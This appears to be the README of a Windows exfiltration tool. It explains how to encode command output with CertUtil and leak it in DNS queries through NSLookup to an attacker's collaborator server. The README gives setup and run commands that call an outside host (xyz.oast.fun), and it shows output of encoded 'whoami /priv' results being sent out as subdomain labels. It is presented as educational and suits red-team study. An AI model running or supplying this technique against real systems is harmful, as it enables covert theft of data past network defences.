# DNS Exfiltrator

Exfiltrate data with DNS queries. Based on CertUtil and NSLookup.

Base64 or Hex encode the command output using CertUtil, and then exfiltrate it in chunks up to 63 characters per query using NSLookup.

In case of Base64 encoding, some special characters will be replaced due to the domain name limitations:

| Base64 Character | Replacement |
| --- | --- |
| \+ | plus |
| \/ | slash |
| \= | eqls |

Tested on Windows 10 Enterprise OS (64-bit).

Made for educational purposes. I hope it will help!

Future plans:

* create a Python script to parse `interact.sh` results,
* create a one-liner out of the whole Batch script,
* create a Burp Suite extension that will use a Burp Collaborator server.

## How to Run

Download, unpack, give necessary permissions, and run the latest [interact.sh](https://github.com/projectdiscovery/interactsh/releases) client:

```fundamental
chmod +x interactsh-client

./interactsh-client -dns-only -json -o interactsh.json
```

After running the tool, you should be able to see the `interact.sh` (collaborator server) subdomain, e.g. `xyz.oast.fun`.

Next, make sure to specify either `base64` or `hex` as the encoding, and [Base64 encode](https://www.base64encode.org) your Batch one-liner command, e.g. `whoami` equals to `d2hvYW1p`.

Finally, open the Command Prompt from [\\src\\](https://github.com/ivan-sincek/dns-exfiltrator/tree/main/src) and run the following command:

```fundamental
dns_exfiltrator.bat xyz.oast.fun base64 d2hvYW1p
```

## Runtime

```fundamental
C:\Users\W10\Desktop>dns_exfiltrator.bat xyz.oast.fun base64 d2hvYW1pIC9wcml2
################################################################
#                                                              #
#                     DNS Exfiltrator v1.3                     #
#                                by Ivan Sincek                #
#                                                              #
# Exfiltrate data with DNS queries.                            #
# GitHub repository at github.com/ivan-sincek/dns-exfiltrator. #
#                                                              #
################################################################
Server:  UnKnown
Address:  172.20.10.1

Non-authoritative answer:
Name:    UFJJVklMRUdFUyBJTkZPUk1BVElPTiANCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0.xyz.oast.fun
Address:  206.189.156.69

Server:  UnKnown
Address:  172.20.10.1

Non-authoritative answer:
Name:    gDQpQcml2aWxlZ2UgTmFtZSAgICAgICAgICAgICAgICBEZXNjcmlwdGlvbiAgIC.xyz.oast.fun
Address:  206.189.156.69

Server:  UnKnown
Address:  172.20.10.1

Non-authoritative answer:
Name:    AgICAgICAgICAgICAgICAgICAgICAgU3RhdGUgICAgDQo9PT09PT09PT09PT09P.xyz.oast.fun
Address:  206.189.156.69

...
```
